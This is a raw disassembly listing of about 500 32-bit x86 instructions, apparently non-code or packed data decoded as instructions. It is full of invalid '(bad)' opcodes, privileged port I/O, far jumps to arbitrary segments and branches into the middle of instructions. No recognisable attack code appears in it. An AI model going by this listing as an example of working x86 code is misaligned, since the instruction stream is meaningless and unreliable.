  41f955:	adc    eax,DWORD PTR [esi-0x1d903b36]
  41f95b:	retf   0x4be3
  41f95e:	stc    
  41f95f:	or     BYTE PTR [edi+eax*2],0x9b
  41f963:	and    DWORD PTR [ecx],ebx
  41f965:	xchg   dh,al
  41f967:	dec    edi
  41f968:	fst    DWORD PTR [esi+0x24353fa0]
  41f96e:	lea    esi,[edi-0x6]
  41f971:	mov    bh,0x94
  41f973:	xlat   BYTE PTR ds:[ebx]
  41f974:	mov    esp,0xc3e3f7fe
  41f979:	ins    DWORD PTR es:[edi],dx
  41f97a:	add    eax,0x886d267c
  41f97f:	les    ebp,FWORD PTR [ebx-0x19]
  41f982:	push   ebp
  41f983:	neg    BYTE PTR [eax+edx*2]
  41f986:	repnz aaa 
  41f988:	loop   0x41f948
  41f98a:	addr16 cwd 
  41f98d:	add    edi,esi
  41f98f:	enter  0x7c9f,0xf3
  41f993:	imul   edx,DWORD PTR [ebx+0x2f],0x7d
  41f997:	adc    al,0x60
  41f999:	cld    
  41f99a:	out    dx,eax
  41f99b:	inc    edx
  41f99c:	pop    ebx
  41f99d:	xchg   ecx,eax
  41f99e:	mov    esi,0x3e2b96e9
  41f9a3:	sbb    DWORD PTR [edi-0x756e00],0x3a
  41f9aa:	push   cs
  41f9ab:	cmc    
  41f9ac:	adc    al,0xa9
  41f9ae:	outs   dx,DWORD PTR ds:[esi]
  41f9af:	and    al,0x42
  41f9b1:	mov    al,0x58
  41f9b3:	fdivrp st(1),st
  41f9b5:	fnstsw WORD PTR [eax+0x20e7bd7a]
  41f9bb:	loop   0x41f972
  41f9bd:	sub    BYTE PTR [ecx-0x30decb7b],dl
  41f9c3:	js     0x41fa0e
  41f9c5:	aas    
  41f9c6:	push   eax
  41f9c7:	xor    bh,0x5a
  41f9ca:	test   al,0x6e
  41f9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9cd:	push   ebp
  41f9ce:	mov    BYTE PTR [edx],al
  41f9d0:	dec    esp
  41f9d1:	sub    DWORD PTR [ebp-0x6a],esp
  41f9d4:	call   0xaf82:0x5ec3c7fc
  41f9db:	push   esi
  41f9dc:	dec    ebx
  41f9dd:	mov    ebp,0x863b5354
  41f9e2:	mov    ds:0x9812ecea,eax
  41f9e7:	icebp  
  41f9e8:	and    BYTE PTR [eax+eax*1-0x30a4bea5],ah
  41f9ef:	pop    ebx
  41f9f0:	(bad)  
  41f9f2:	aad    0xf
  41f9f4:	ss dec esp
  41f9f6:	dec    esi
  41f9f7:	js     0x41f9f1
  41f9f9:	sub    eax,DWORD PTR ss:[eax+ecx*8+0x1]
  41f9fe:	add    bh,ah
  41fa00:	add    DWORD PTR [eax],eax
  41fa02:	add    dh,ah
  41fa04:	popa   
  41fa05:	mov    esi,0x60a64dfa
  41fa0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa0b:	adc    dl,BYTE PTR ss:[eax+eiz*1+0x7d695d90]
  41fa13:	adc    ebx,edx
  41fa15:	int3   
  41fa16:	pop    es
  41fa17:	mov    BYTE PTR [eax],ch
  41fa19:	or     eax,0x194f1246
  41fa1e:	mov    esp,0x9cbcc2dc
  41fa23:	ret    0x9815
  41fa26:	ins    DWORD PTR es:[edi],dx
  41fa27:	movzx  ebp,WORD PTR [esi+0x24b01faf]
  41fa2e:	aaa    
  41fa2f:	dec    esi
  41fa30:	les    esp,FWORD PTR [ecx+0xb6fea5e]
  41fa36:	fucom  st(3)
  41fa38:	ret    
  41fa39:	fstp   TBYTE PTR [ecx+0x8]
  41fa3c:	push   edx
  41fa3d:	daa    
  41fa3e:	aas    
  41fa3f:	nop
  41fa40:	jno    0x41fa27
  41fa42:	div    BYTE PTR [edi-0x7d7f634c]
  41fa48:	fidiv  WORD PTR [ebx]
  41fa4a:	outs   dx,DWORD PTR ds:[esi]
  41fa4b:	pop    esp
  41fa4c:	es out dx,al
  41fa4e:	or     eax,0x5c
  41fa51:	dec    esp
  41fa52:	pop    es
  41fa53:	ret    0x7603
  41fa56:	cld    
  41fa57:	xor    eax,0xeee460e5
  41fa5c:	leave  
  41fa5d:	out    dx,eax
  41fa5e:	mov    eax,ds:0x6fb5b6d1
  41fa63:	push   ds
  41fa64:	stc    
  41fa65:	mov    bh,0x34
  41fa67:	sbb    eax,0xbcd89126
  41fa6c:	stos   DWORD PTR es:[edi],eax
  41fa6d:	pop    edx
  41fa6e:	retf   0xe0a2
  41fa71:	scas   al,BYTE PTR es:[edi]
  41fa72:	jne    0x41fae8
  41fa74:	jne    0x41fad4
  41fa76:	sub    al,0xf
  41fa78:	sti    
  41fa79:	int3   
  41fa7a:	mov    bl,0x33
  41fa7c:	leave  
  41fa7d:	daa    
  41fa7e:	in     ax,0x93
  41fa81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa82:	pop    ss
  41fa83:	inc    eax
  41fa84:	or     dl,ah
  41fa86:	fs call 0xe5b9:0xab29ab7
  41fa8e:	pop    eax
  41fa8f:	inc    edx
  41fa90:	xchg   BYTE PTR [ebx+0x1f],bl
  41fa93:	xchg   ecx,ebx
  41fa95:	retf   0x4d04
  41fa98:	mov    edx,esp
  41fa9a:	cmp    eax,0xb56e1d92
  41fa9f:	mov    dh,0xed
  41faa1:	ror    ch,0x3d
  41faa4:	sub    ch,cl
  41faa6:	push   ebp
  41faa7:	lock pop ecx
  41faa9:	arpl   WORD PTR ds:0x564d3e95,bx
  41faaf:	test   BYTE PTR [ebp+0x6cbffc79],0x87
  41fab6:	shr    esp,0x4d
  41fab9:	dec    ebp
  41faba:	dec    esi
  41fabb:	mov    ebx,0x39aa6a92
  41fac0:	adc    ch,BYTE PTR [esi]
  41fac2:	lahf   
  41fac3:	sub    esi,edi
  41fac5:	clc    
  41fac6:	mov    ebp,0xcd514781
  41facb:	fild   QWORD PTR [ebx+ecx*8+0x2]
  41facf:	pushf  
  41fad0:	sahf   
  41fad1:	out    dx,al
  41fad2:	cmp    eax,0x905d8d0e
  41fad7:	pop    ds
  41fad8:	mov    dh,BYTE PTR [eax-0x21]
  41fadb:	test   al,0xd
  41fadd:	cmp    eax,0x1f77714a
  41fae2:	xchg   edx,eax
  41fae3:	repz in eax,0x1a
  41fae6:	out    0x23,al
  41fae8:	jl     0x41faa2
  41faea:	dec    edx
  41faeb:	xchg   ebx,eax
  41faec:	outs   dx,BYTE PTR ds:[esi]
  41faed:	call   FWORD PTR [edx-0x6a]
  41faf0:	push   eax
  41faf1:	aas    
  41faf2:	stc    
  41faf3:	mov    ebp,0x9837efd5
  41faf8:	inc    eax
  41fafa:	enter  0xbfd5,0x2d
  41fafe:	push   ss
  41faff:	push   cs
  41fb00:	and    BYTE PTR [ecx],ch
  41fb02:	fild   WORD PTR [ecx+0x3f]
  41fb05:	xchg   BYTE PTR [ebx+0x20fe2337],ch
  41fb0b:	mov    WORD PTR [edi+eiz*1],?
  41fb0e:	pushf  
  41fb0f:	mov    bl,0x6e
  41fb11:	ret    
  41fb12:	pop    ebx
  41fb13:	call   0x22307749
  41fb18:	xor    DWORD PTR [esi+0x34],0x770e0e3a
  41fb1f:	hlt    
  41fb20:	jbe    0x41fb2c
  41fb22:	repz push edi
  41fb24:	add    edx,edi
  41fb26:	and    al,0xe6
  41fb28:	jl     0x41fafe
  41fb2a:	adc    eax,0x636359b8
  41fb2f:	add    ebp,eax
  41fb31:	idiv   BYTE PTR [esi+edx*4]
  41fb34:	dec    ebp
  41fb35:	push   ds
  41fb36:	in     al,dx
  41fb37:	(bad)  
  41fb38:	call   0x4fa1ef5e
  41fb3d:	sbb    eax,0x63099e40
  41fb42:	(bad)
  41fb45:	mov    al,ds:0x656bb0fa
  41fb4a:	jae    0x41fb9a
  41fb4c:	mov    bl,0xf1
  41fb4e:	cmp    DWORD PTR [ebp+0x5c],ebp
  41fb51:	imul   ecx,edi,0xffffffcb
  41fb54:	and    DWORD PTR [eax-0x7ac9c900],ecx
  41fb5a:	pop    ebp
  41fb5b:	clc    
  41fb5c:	push   cs
  41fb5d:	xor    bl,BYTE PTR [edx+eiz*2-0x59]
  41fb61:	out    0xf,al
  41fb63:	inc    ecx
  41fb64:	mov    eax,ds:0x9e67b7d1
  41fb69:	int3   
  41fb6a:	or     edi,DWORD PTR [esp+eiz*8+0x13b4174e]
  41fb71:	xlat   BYTE PTR ds:[ebx]
  41fb72:	ins    BYTE PTR es:[edi],dx
  41fb73:	or     dh,bh
  41fb75:	mov    ebx,0xd6e9e2e3
  41fb7a:	xchg   ebx,eax
  41fb7b:	push   esi
  41fb7c:	xor    eax,0xa6dee3dc
  41fb81:	je     0x41fbbe
  41fb83:	nop
  41fb84:	lds    eax,FWORD PTR [eax]
  41fb86:	int    0x34
  41fb88:	sub    al,BYTE PTR [ecx]
  41fb8a:	jo     0x41fb15
  41fb8c:	mov    ebp,0x17d56bec
  41fb91:	adc    al,cl
  41fb93:	xor    eax,0xb99be591
  41fb98:	adc    edx,eax
  41fb9a:	retf   0x4ad8
  41fb9d:	mov    ebx,DWORD PTR [ebp+0x4bc29fa1]
  41fba3:	(bad)  
  41fba4:	jbe    0x41fbd4
  41fba6:	jo     0x41fb8f
  41fba8:	jmp    0x7919f0c1
  41fbad:	add    BYTE PTR [ecx-0x1bbf50a4],ah
  41fbb3:	jno    0x41fb71
  41fbb5:	out    0x80,eax
  41fbb7:	dec    ebp
  41fbb8:	scas   al,BYTE PTR es:[edi]
  41fbb9:	cmp    DWORD PTR [esi+0x56],ebx
  41fbbc:	test   al,0xfd
  41fbbe:	mov    dh,0xaf
  41fbc0:	dec    ebp
  41fbc1:	in     al,dx
  41fbc2:	xchg   ebx,eax
  41fbc3:	push   ecx
  41fbc4:	or     dh,dl
  41fbc6:	je     0x41fb82
  41fbc8:	mov    dl,0x77
  41fbca:	ja     0x41fbe7
  41fbcc:	popa   
  41fbcd:	shr    DWORD PTR [ebx+0x1f],1
  41fbd0:	mov    dh,0x23
  41fbd3:	jmp    0xf55:0x84141d95
  41fbda:	adc    ecx,eax
  41fbdc:	arpl   WORD PTR [eax+0x75c440a4],sp
  41fbe2:	add    esi,esp
  41fbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe5:	xlat   BYTE PTR ss:[ebx]
  41fbe7:	clc    
  41fbe8:	mov    ebp,0x859b0095
  41fbed:	gs cmp al,0x7f
  41fbf0:	cld    
  41fbf1:	(bad)  [edi-0x65be08a1]
  41fbf7:	adc    al,0x8e
  41fbf9:	adc    eax,DWORD PTR [eax+0x1ca2b]
  41fbff:	out    0x1,eax
  41fc01:	add    BYTE PTR [eax],al
  41fc03:	pushf  
  41fc04:	sbb    DWORD PTR [edx-0x51],0xcaf694e8
  41fc0b:	ss mov ebp,0x35f0acf5
  41fc11:	int    0x25
  41fc13:	shl    DWORD PTR [ebx],0xfd
  41fc16:	dec    ebx
  41fc17:	xor    DWORD PTR [edx+0x15],edi
  41fc1a:	jb     0x41fc63
  41fc1c:	pop    eax
  41fc1d:	xchg   DWORD PTR [esi],edx
  41fc1f:	aaa    
  41fc20:	ret    
  41fc21:	(bad)  
  41fc22:	aad    0xfd
  41fc24:	repnz das 
  41fc26:	sub    bx,WORD PTR [edi+0x7b]
  41fc2a:	popf   
  41fc2b:	jnp    0x41fbcc
  41fc2d:	lea    ebp,[ebx+0x63926b83]
  41fc33:	mov    ds:0x4155b452,al
  41fc38:	mov    WORD PTR [esi-0x5],gs
  41fc3b:	mov    DWORD PTR [ebx-0x5a0445d1],0xe591f245
  41fc45:	push   ss
  41fc46:	mov    edx,eax
  41fc48:	mov    ch,0x1d
  41fc4a:	mov    edx,0x50cad226
  41fc4f:	sub    cl,BYTE PTR [edi+0xce91493]
  41fc55:	lds    eax,FWORD PTR [ecx-0x60]
  41fc58:	cmp    dh,BYTE PTR [eax-0x3646ffbd]
  41fc5e:	jle    0x41fc26
  41fc60:	ins    DWORD PTR es:[edi],dx
  41fc61:	sbb    eax,0x7d98af0d
  41fc66:	and    dl,BYTE PTR [eax+0x29]
  41fc69:	add    DWORD PTR [edi+0x14e09733],0x46b3b36d
  41fc73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc74:	mov    edi,0xe4ca6654
  41fc79:	cmc    
  41fc7a:	adc    edx,DWORD PTR [esi]
  41fc7c:	popf   
  41fc7d:	sub    dl,cl
  41fc7f:	mov    WORD PTR [ebx-0x1],ss
  41fc82:	xor    DWORD PTR [esi-0x5e],0xc31cb6
  41fc89:	mov    ah,0x74
  41fc8b:	das    
  41fc8c:	lahf   
  41fc8d:	jge    0x41fc32
  41fc8f:	aaa    
  41fc90:	in     eax,0xa5
  41fc92:	setl   BYTE PTR [edx-0x48df8713]
  41fc99:	imul   edi,ebp,0x48
  41fc9c:	jmp    0x4805:0xe5c798d2
  41fca3:	jae    0x41fc97
  41fca5:	cmp    ebx,DWORD PTR [edi+0x3cec6b9a]
  41fcab:	push   cs
  41fcac:	sub    edi,DWORD PTR [ebx+eax*2+0x4cae4d30]
  41fcb3:	pop    ecx
  41fcb4:	mov    cl,0xda
  41fcb6:	xor    BYTE PTR [edx+0x224aceec],0xc0
  41fcbd:	push   ebp
  41fcbe:	fadd   st,st(7)
  41fcc0:	jno    0x41fc87
  41fcc2:	push   cs
  41fcc3:	xor    al,0xf1
  41fcc5:	pop    edi
  41fcc6:	cmc    
  41fcc7:	stos   BYTE PTR es:[edi],al
  41fcc8:	xchg   esp,eax
  41fcc9:	jo     0x41fcce
  41fccb:	mov    cl,0xfc
  41fccd:	mov    dh,BYTE PTR [eax+0x767d7326]
  41fcd3:	mov    BYTE PTR [eax],dh
  41fcd5:	scas   al,BYTE PTR es:[edi]
  41fcd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd7:	mov    al,ds:0x79fec399
  41fcdc:	sub    DWORD PTR [esi+0x19b5d7e8],0xffffffde
  41fce3:	adc    eax,eax
  41fce5:	xchg   edx,eax
  41fce6:	jl     0x41fd07
  41fce8:	lds    esi,FWORD PTR [ebp-0x552ce2e9]
  41fcee:	sbb    eax,0x37171327
  41fcf3:	push   ds
  41fcf4:	inc    eax
  41fcf5:	popa   
  41fcf6:	dec    ecx
  41fcf7:	pop    ebx
  41fcf8:	rcr    dh,0x17
  41fcfb:	pop    eax
  41fcfc:	mov    cl,BYTE PTR [ebp-0x13]
  41fcff:	sub    cl,BYTE PTR [edx+0x55]
  41fd02:	jp     0x41fd6a
  41fd04:	pop    edi
  41fd05:	leave  
  41fd06:	mov    ds:0xf28d69e6,eax
  41fd0b:	cmc    
  41fd0c:	call   0x9cd6:0xe811d614
  41fd13:	fldenv [esi]
  41fd15:	sub    eax,esi
  41fd17:	in     eax,dx
  41fd18:	fbstp  TBYTE PTR [ebx]
  41fd1a:	mov    esp,0xe0a6f2f2
  41fd1f:	pop    esi
  41fd20:	fxch   st(2)
  41fd22:	mov    esp,0xd28f7773
  41fd27:	aad    0x6d
  41fd29:	idiv   dh
  41fd2b:	lds    ebp,FWORD PTR [esi]
  41fd2d:	mov    edx,0xe0530109
  41fd32:	(bad)  
  41fd33:	mov    WORD PTR [ecx+0x3bba7acc],cs
  41fd39:	xor    eax,0x643124a
  41fd3e:	in     eax,0x90
  41fd40:	push   ss
  41fd41:	jnp    0x41fd71
  41fd43:	xchg   ebx,eax
  41fd44:	and    al,0x6d
  41fd46:	xchg   ebp,esi
  41fd48:	pop    edx
  41fd49:	test   BYTE PTR [eax+0x52],al
  41fd4c:	mov    al,0xe
  41fd4e:	fst    st(3)
  41fd50:	icebp  
  41fd51:	or     ch,BYTE PTR [ecx+ebp*4]
  41fd54:	es (bad) 
  41fd56:	(bad)  
  41fd57:	in     al,dx
  41fd58:	sub    ch,BYTE PTR [edx]
  41fd5a:	lods   al,BYTE PTR ds:[esi]
  41fd5b:	cmp    esp,ecx
  41fd5d:	mov    ?,edi
  41fd5f:	ror    dl,0xa5
  41fd62:	(bad)  
  41fd63:	xchg   esp,eax
  41fd64:	popa   
  41fd65:	xlat   BYTE PTR ds:[ebx]
  41fd66:	call   0x1805:0xd4cdffac
  41fd6d:	pop    edx
  41fd6e:	cmp    ebx,0xffffffa1
  41fd71:	xlat   BYTE PTR ds:[ebx]
  41fd72:	xchg   esp,eax
  41fd73:	mov    ebp,0xccc97e37
  41fd78:	and    bh,bh
  41fd7a:	int3   
  41fd7b:	mov    al,ds:0xc5726b6
  41fd80:	retf   
  41fd81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd82:	sti    
  41fd83:	arpl   WORD PTR [edx+ebx*4+0x6f],dx
  41fd87:	sti    
  41fd88:	push   0x1a
  41fd8a:	push   ss
  41fd8b:	and    eax,0xf1e73348
  41fd90:	call   0xa25a77eb
  41fd95:	mov    ds:0x4b7c6754,al
  41fd9a:	and    bh,BYTE PTR [edx+esi*4]
  41fd9d:	inc    ebp
  41fd9e:	inc    edi
  41fd9f:	(bad)  
  41fda0:	ficom  WORD PTR [bx+si+0x3d]
  41fda4:	(bad)  
  41fda5:	adc    eax,0x67dac567
  41fdaa:	cmp    bh,cl
  41fdac:	je     0x41fdf2
  41fdae:	sub    ah,BYTE PTR [ecx-0x62]
  41fdb1:	fcom   st(6)
  41fdb3:	sub    DWORD PTR [esi],esp
  41fdb5:	lods   al,BYTE PTR ds:[esi]
  41fdb6:	mov    al,0x9
  41fdb8:	cmp    al,0x57
  41fdba:	jo     0x41fddb
  41fdbc:	xlat   BYTE PTR ds:[ebx]
  41fdbd:	in     al,dx
  41fdbe:	test   DWORD PTR [ecx-0x7b],0x6d0a8e6a
  41fdc5:	xchg   edi,eax
  41fdc6:	xor    cl,dl
  41fdc8:	adc    esi,DWORD PTR [edx]
  41fdca:	fisttp QWORD PTR [edx]
  41fdcc:	in     al,dx
  41fdcd:	pop    ss
  41fdce:	in     eax,0xd6
  41fdd0:	inc    esp
  41fdd1:	out    dx,al
  41fdd2:	inc    esp
  41fdd3:	std    
  41fdd4:	mov    esi,0x856a7d90
  41fdd9:	jge    0x41fe41
  41fddb:	cmp    bl,BYTE PTR [ecx-0x5]
  41fdde:	clc    
  41fddf:	ss jl  0x41fdb0
  41fde2:	(bad)  
  41fde3:	and    eax,0xe263b2a7
  41fde8:	outs   dx,DWORD PTR ds:[esi]
  41fde9:	mov    eax,0xf0736e00
  41fdee:	retf   0xcbfd
  41fdf1:	jle    0x41fdea
  41fdf3:	repz xor eax,0x3f1f8ce9
  41fdf9:	mov    BYTE PTR [eax+0x12],dl
  41fdfc:	int3   
  41fdfd:	add    DWORD PTR [eax],eax
  41fdff:	out    0x1,eax
  41fe01:	add    BYTE PTR [eax],al
  41fe03:	scas   al,BYTE PTR es:[edi]
  41fe04:	xchg   ebp,eax
  41fe05:	retf   
  41fe06:	mov    ah,0x7c
  41fe08:	scas   eax,DWORD PTR es:[edi]
  41fe09:	sbb    BYTE PTR [esp+eiz*4],cl
  41fe0c:	jae    0x41fe4d
  41fe0e:	mov    ecx,0x2895ac2c
  41fe13:	push   0x1f
  41fe15:	(bad)  
  41fe16:	retf   
  41fe17:	mov    eax,ebx
  41fe19:	loop   0x41fe83
  41fe1b:	out    0x53,al
  41fe1d:	clc    
  41fe1e:	xchg   ebx,eax
  41fe1f:	dec    esp
  41fe20:	inc    ebp
  41fe21:	dec    eax
  41fe22:	cmp    ecx,DWORD PTR [esi-0x61]
  41fe25:	add    eax,0xdbd35062
  41fe2a:	cld    
  41fe2b:	xchg   edx,eax
  41fe2c:	dec    eax
  41fe2d:	xchg   edi,eax
  41fe2e:	dec    eax
  41fe2f:	pop    ds
  41fe30:	jl     0x41fe90
  41fe32:	inc    edx
  41fe33:	push   cs
  41fe34:	dec    ecx
  41fe35:	dec    ebx
  41fe36:	icebp  
  41fe37:	push   ss
  41fe38:	adc    dl,BYTE PTR ds:0x9fdfb7d0
  41fe3e:	xor    cl,BYTE PTR [ebp+0x63]
  41fe41:	das    
  41fe42:	test   al,0xf0
  41fe44:	pop    ebx
  41fe45:	fsubr  DWORD PTR [ebp+0x0]
  41fe48:	xor    bh,BYTE PTR [eax-0x69]
  41fe4b:	push   edi
  41fe4c:	repnz mov dh,BYTE PTR [ebp+edx*1+0x19]
  41fe51:	call   0x9ee3d153
  41fe56:	sub    BYTE PTR [edi],dh
  41fe58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe59:	or     al,0xec
  41fe5b:	mov    dl,0xe
  41fe5d:	mov    esp,0x288b9aea
  41fe62:	(bad)  
  41fe64:	dec    eax
  41fe65:	aad    0xa4
  41fe67:	cmp    eax,0x9fbb6411
  41fe6c:	xchg   ebp,eax
  41fe6d:	(bad)  
  41fe6e:	scas   al,BYTE PTR es:[edi]
  41fe6f:	ss pop ecx
  41fe71:	imul   ebx,ebp,0xffffff80
  41fe74:	cdq    
  41fe75:	pop    edi
  41fe76:	(bad)  
  41fe77:	and    dh,cl
  41fe79:	dec    ebx
  41fe7a:	xor    eax,0x3043c95c
  41fe7f:	pop    esi
  41fe80:	pop    ebp
  41fe81:	mov    bl,0x3
  41fe83:	repnz and cl,dh
  41fe86:	fsubr  DWORD PTR [edx+0x28581694]
  41fe8c:	xor    bh,ah
  41fe8e:	sub    ebx,DWORD PTR [eax]
  41fe90:	inc    edi
  41fe91:	(bad)  
  41fe92:	sub    eax,0x312a526f
  41fe97:	jg     0x41fef9
  41fe99:	lds    edi,FWORD PTR [edi-0x8dfed3b]
  41fe9f:	out    dx,eax
  41fea0:	data16 cmp al,0x64
  41fea3:	adc    al,0xb9
  41fea5:	dec    eax
  41fea6:	adc    ecx,esp
  41fea8:	cmp    al,0xff
  41feaa:	aad    0xd9
  41feac:	cwde   
  41fead:	test   dh,0x11
  41feb0:	sub    dl,BYTE PTR [eax+0x72]
  41feb3:	ja     0x41fe85
  41feb5:	fsub   QWORD PTR [edi+0x103210df]
  41febb:	inc    ebp
  41febc:	mov    ch,0xff
  41febe:	retf   0x40a1
  41fec1:	popf   
  41fec2:	cli    
  41fec3:	mov    cl,0x2e
  41fec5:	mov    dl,0x44
  41fec7:	dec    ebx
  41fec8:	or     bl,al
  41feca:	out    dx,eax
  41fecb:	test   edx,ecx
  41fecd:	or     al,0xe1
  41fecf:	out    0xd8,eax
  41fed1:	mov    WORD PTR [ecx+eax*1],ds
  41fed4:	daa    
  41fed5:	mov    bl,0x92
  41fed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fed8:	pop    edi
  41fed9:	sbb    al,0x1d
  41fedb:	retf   0x67ed
  41fede:	lahf   
  41fedf:	addr16 sub cl,0xe9
  41fee3:	sub    DWORD PTR [edx-0x2c],ebx
  41fee6:	xchg   esi,eax
  41fee7:	jmp    0x4c08:0x81616b11
  41feee:	sub    edi,ecx
  41fef0:	mov    al,0xc1
  41fef2:	enterw 0xd9a1,0x82
  41fef7:	mov    al,ds:0x16b3a169
  41fefc:	push   esp
  41fefd:	jmp    0x41ff1c
  41feff:	mov    ebx,0x1deb4668
  41ff04:	mov    esi,0x7218249c
  41ff09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff0a:	sub    al,0xb9
  41ff0c:	idiv   eax
  41ff0e:	retf   
  41ff0f:	fcom   DWORD PTR [edi-0x6ccb40a3]
  41ff15:	pop    eax
  41ff16:	cmp    DWORD PTR [edi+ebp*2+0x44],edi
  41ff1a:	das    
  41ff1b:	hlt    
  41ff1c:	(bad)  
  41ff1d:	imul   ebp,ecx,0x1d
  41ff20:	sbb    ebx,esi
  41ff22:	les    ecx,FWORD PTR [ecx]
  41ff24:	sbb    BYTE PTR [esi+ebx*1],0x6e
  41ff28:	xchg   BYTE PTR [esi+0x32],al
  41ff2b:	cmp    al,0xf3
  41ff2d:	adc    eax,0x5f94e0c4
  41ff32:	mov    bh,0xfc
  41ff34:	mov    DWORD PTR [ebp-0x49],ebx
  41ff37:	loopne 0x41ff00
  41ff39:	ret    0x3d08
  41ff3c:	(bad)  [edx]
  41ff3e:	shl    bl,cl
  41ff40:	cli    
  41ff41:	inc    ebp
  41ff42:	(bad)  
  41ff43:	push   esp
  41ff44:	arpl   WORD PTR [edx],di
  41ff46:	xchg   ebx,eax
  41ff47:	icebp  
  41ff48:	scas   al,BYTE PTR es:[edi]
  41ff49:	sub    al,0xdd
  41ff4b:	or     eax,DWORD PTR [edx]
  41ff4d:	stos   DWORD PTR es:[edi],eax
  41ff4e:	test   eax,0x20222025
  41ff53:	adc    ebp,DWORD PTR [ecx+0x62]
  41ff56:	mov    ebx,edx
  41ff58:	sub    eax,0xadb1c9b0
  41ff5d:	stc    
  41ff5e:	mov    esp,0x8643208e
  41ff63:	ror    DWORD PTR [edi],1
  41ff65:	lods   eax,DWORD PTR ds:[esi]
  41ff66:	xchg   esp,eax
  41ff67:	aad    0xb4
  41ff69:	xchg   esi,eax
  41ff6a:	shr    BYTE PTR [esi+0x29],0xcb
  41ff6e:	pushf  
  41ff6f:	pop    es
  41ff70:	jo     0x41ffd0
  41ff72:	(bad)  
  41ff73:	fadd   QWORD PTR [eax+0x1ce8518a]
  41ff79:	int3   
  41ff7a:	jns    0x41ff50
  41ff7c:	out    0x48,al
  41ff7e:	cld    
  41ff7f:	mov    edi,0x764aa460
  41ff84:	xor    al,0xf2
  41ff86:	stc    
  41ff87:	cli    
  41ff88:	aad    0x5b
  41ff8a:	out    0x12,al
  41ff8c:	pop    esp
  41ff8d:	push   ebp
  41ff8e:	loop   0x41ffa1
  41ff90:	loope  0x41ff4d
  41ff92:	ret    0xbd74
  41ff95:	jp     0x420004
  41ff97:	rcr    BYTE PTR [eax+0x7d],0x68
  41ff9b:	mov    al,BYTE PTR [edx+0x7a]
  41ff9e:	inc    eax
  41ff9f:	js     0x41ffa5
  41ffa1:	pop    eax
  41ffa2:	mov    ah,0x74
  41ffa4:	dec    ebx
  41ffa5:	fsub   DWORD PTR [edx-0x6f1d14f4]
  41ffab:	mov    edx,0xc6919c76
  41ffb0:	cmp    DWORD PTR ds:0xb543ce2c,esp
  41ffb6:	iret   
  41ffb7:	mov    esi,gs
  41ffb9:	es call 0x7b8dcb0
  41ffbf:	clc    
  41ffc0:	mov    edi,gs
  41ffc2:	bound  eax,QWORD PTR [esi-0x6080e96b]
  41ffc8:	cs ret 
  41ffca:	mov    bl,0x43
  41ffcc:	mov    ss,WORD PTR [edi-0x72]
  41ffcf:	fnstenv [esi]
  41ffd1:	outs   dx,BYTE PTR ds:[esi]
  41ffd2:	fsub   QWORD PTR [ebx]
  41ffd4:	scas   al,BYTE PTR es:[edi]
  41ffd5:	pop    edi
  41ffd6:	mov    al,0x3e
  41ffd8:	sub    al,0xb6
  41ffda:	inc    esp
  41ffdb:	jg     0x420006
  41ffdd:	inc    edi
  41ffde:	jo     0x41ffe7
  41ffe0:	inc    esi
  41ffe1:	mov    eax,ds:0xff5d470f
  41ffe6:	add    DWORD PTR [edi+esi*8],ebp
  41ffe9:	int3   
  41ffea:	add    ch,dh
  41ffec:	adc    al,0xae
  41ffee:	adc    ebp,edi
  41fff0:	mov    ebx,0x84e6f6fd
  41fff5:	lds    ebp,FWORD PTR [edx-0x1e3f925c]
  41fffb:	stc    
  41fffc:	int    0x1
  41fffe:	add    bh,ah
  420000:	add    DWORD PTR [eax],eax
  420002:	add    BYTE PTR [ebp+0x77],bh
  420005:	hlt    
  420006:	repz jle 0x41ff9f
  420009:	mov    al,ch
  42000b:	ror    BYTE PTR [edx+0x1d],1
  42000e:	fmul   st,st(5)
  420010:	adc    eax,0xd1c4f8f1
  420015:	cmp    bh,BYTE PTR [edi-0x65]
  420018:	jbe    0x41ffcd
  42001a:	adc    edi,DWORD PTR [esi-0x78]
  42001d:	pop    es
  42001e:	cdq    
  42001f:	in     al,dx
  420020:	mov    ah,0x5d
  420022:	jge    0x42005c
  420024:	xchg   edx,eax
  420025:	jge    0x420026
  420027:	sub    esi,ebx
  420029:	cmp    eax,0xe775f116
  42002e:	jnp    0x420060
  420030:	cmp    eax,0x87834f16
  420035:	mov    ebp,0x654e00ea
  42003a:	xor    eax,ecx
  42003c:	in     al,dx
  42003d:	out    dx,eax
  42003e:	sub    al,0x82
  420040:	mov    ebx,0xf7cb9b2
  420045:	clc    
  420046:	mov    dh,BYTE PTR [edx+0x1]
  420049:	loop   0x41ffdd
  42004b:	hlt    
  42004c:	pop    es
  42004d:	test   eax,0xd6ff2de4
  420052:	repz push ebx
  420054:	mov    dl,0xb6
  420056:	xor    al,BYTE PTR [ebx-0x1c]
  420059:	aam    0x1e
  42005b:	icebp  
  42005c:	mov    ah,0x3a
  42005e:	mov    cs,WORD PTR [eax]
  420060:	cmp    bl,bl
  420062:	jg     0x420033
  420064:	jno    0x420029
  420066:	out    0xe4,al
  420068:	jnp    0x420073
  42006a:	adc    al,0x6c
  42006c:	cmp    ebx,eax
  42006e:	jo     0x420079
  420070:	jle    0x42000e
  420072:	iret   
  420073:	jp     0x42006d
  420075:	pop    esi
  420076:	mov    dl,0x67
  420078:	add    eax,0x37d3cede
  42007d:	mov    al,0x5b
  42007f:	adc    al,BYTE PTR [ebx+ebp*8-0x5fb393f0]
  420086:	xor    dl,BYTE PTR [ebx-0x567503d3]
  42008c:	(bad)  
  42008d:	inc    DWORD PTR [eax-0x14]
  420090:	fbld   TBYTE PTR [ecx+0x7da5ff27]
  420096:	xor    eax,ebp
  420098:	push   esp
  420099:	jl     0x42007d
  42009b:	inc    ebx
  42009c:	and    al,0x93
  42009e:	mov    eax,0x467069bd
  4200a3:	js     0x42004b
  4200a5:	jl     0x4200ef
  4200a7:	or     al,0x48
  4200a9:	jmp    0x6a20c5cd
  4200ae:	outs   dx,BYTE PTR ds:[esi]
  4200af:	mov    ah,al
  4200b1:	fsub   st,st(6)
